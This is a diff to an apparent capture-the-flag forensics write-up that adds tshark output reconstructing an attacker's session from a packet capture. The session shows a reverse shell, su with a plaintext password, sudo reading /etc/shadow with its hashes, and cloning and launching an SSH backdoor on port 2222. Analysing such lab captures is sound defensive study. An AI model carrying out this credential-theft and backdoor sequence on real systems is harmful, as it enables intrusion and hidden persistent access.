@@ -74,6 +74,301 @@ Upload File
 for stream in `tshark -r overpass2.pcapng -Y "ip.addr eq 192.168.170.145 and tcp.port eq 4242" -T fields -e tcp.stream | sort -n -u`; do echo Stream: $stream; tshark -r overpass2.pcapng -q -z follow,tcp,ascii,$stream; done
 ```
 
+```
+Stream: 3
+
+===================================================================
+Follow: tcp,ascii
+Filter: tcp.stream eq 3
+Node 0: 192.168.170.159:57680
+Node 1: 192.168.170.145:4242
+55
+/bin/sh: 0: can't access tty; job control turned off
+$
+        3
+id
+
+54
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+2
+$
+        47
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+64
+www-data@overpass-production:/var/www/html/development/uploads$
+        8
+ls -lAh
+
+9
+ls -lAh
+
+12
+total 8.0K
+
+118
+-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
+-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php
+
+64
+www-data@overpass-production:/var/www/html/development/uploads$
+        14
+cat .overpass
+
+15
+cat .overpass
+
+51
+,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.
+64
+www-data@overpass-production:/var/www/html/development/uploads$
+        9
+su james
+
+10
+su james
+
+10
+Password:
+        23
+whenevernoteartinstant
+
+2
+
+61
+james@overpass-production:/var/www/html/development/uploads$
+        5
+cd ~
+
+6
+cd ~
+
+29
+james@overpass-production:~$
+        9
+sudo -l]
+
+10
+sudo -l]
+
+513
+sudo: invalid option -- ']'
+usage: sudo -h | -K | -k | -V
+usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
+usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
+            [command]
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
+            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
+            prompt] [-T timeout] [-u user] file ...
+
+29
+james@overpass-production:~$
+        8
+sudo -l
+
+9
+sudo -l
+
+27
+[sudo] password for james:
+        23
+whenevernoteartinstant
+
+2
+
+
+304
+Matching Defaults entries for james on overpass-production:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on overpass-production:
+    (ALL : ALL) ALL
+james@overpass-production:~$
+        21
+sudo cat /etc/shadow
+
+22
+sudo cat /etc/shadow
+
+1462
+root:*:18295:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+sshd:*:18464:0:99999:7:::
+james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
+paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
+szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
+bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
+muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
+
+29
+james@overpass-production:~$
+        52
+git clone https://github.com/NinjaJc01/ssh-backdoor
+
+55
+^M<git clone https://github.com/NinjaJc01/ssh-backdoor
+
+32
+Cloning into 'ssh-backdoor'...
+
+94
+remote: Enumerating objects: 18, done.
+remote: Counting objects:   5% (1/18)
+1645
+remote: Counting objects:  11% (2/18)        ^Mremote: Counting objects:  16% (3/18)        ^Mremote: Counting objects:  22% (4/18)        ^Mremote: Counting objects>
+remote: Compressing objects:   6% (1/15)        ^Mremote: Compressing objects:  13% (2/15)        ^Mremote: Compressing objects:  20% (3/15)        ^Mremote: Compres>
+
+34
+Unpacking objects:   5% (1/18)
+34
+Unpacking objects:  11% (2/18)
+34
+Unpacking objects:  16% (3/18)
+34
+Unpacking objects:  22% (4/18)
+34
+Unpacking objects:  27% (5/18)
+34
+Unpacking objects:  33% (6/18)
+34
+Unpacking objects:  38% (7/18)
+71
+remote: Total 18 (delta 4), reused 7 (delta 1), pack-reused 0
+
+34
+Unpacking objects:  44% (8/18)
+34
+Unpacking objects:  50% (9/18)
+35
+Unpacking objects:  55% (10/18)
+35
+Unpacking objects:  61% (11/18)
+35
+Unpacking objects:  66% (12/18)
+35
+Unpacking objects:  72% (13/18)
+35
+Unpacking objects:  77% (14/18)
+35
+Unpacking objects:  83% (15/18)
+35
+Unpacking objects:  88% (16/18)
+35
+Unpacking objects:  94% (17/18)
+75
+Unpacking objects: 100% (18/18)   ^MUnpacking objects: 100% (18/18), done.
+
+29
+james@overpass-production:~$
+        16
+cd ssh-backdoor
+
+59
+cd ssh-backdoor
+james@overpass-production:~/ssh-backdoor$
+        11
+ssh-keygen
+
+12
+ssh-keygen
+
+41
+Generating public/private rsa key pair.
+
+63
+Enter file in which to save the key (/home/james/.ssh/id_rsa):
+        7
+id_rsa
+
+52
+id_rsa
+Enter passphrase (empty for no passphrase):
+        1
+
+
+31
+
+Enter same passphrase again:
+        1
+
+
+2
+
+
+47
+Your identification has been saved in id_rsa.
+
+412
+Your public key has been saved in id_rsa.pub.
+The key fingerprint is:
+SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
+The key's randomart image is:
++---[RSA 2048]----+
+|        .. .     |
+|       .  +      |
+|      o   .=.    |
+|     . o  o+.    |
+|      + S +.     |
+|     =.o %.      |
+|    ..*.% =.     |
+|    .+.X+*.+     |
+|   .oo=++=Eo.    |
++----[SHA256]-----+
+
+42
+james@overpass-production:~/ssh-backdoor$
+        18
+chmod +x backdoor
+
+17
+chmod +x backdoor
+2
+
+
+42
+james@overpass-production:~/ssh-backdoor$
+        143
+./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
+
+55
+^M<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
+
+62
+SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
+2
+
+```
+
+
 ### What was the URL of the page they used to upload a reverse shell?
 
 ```
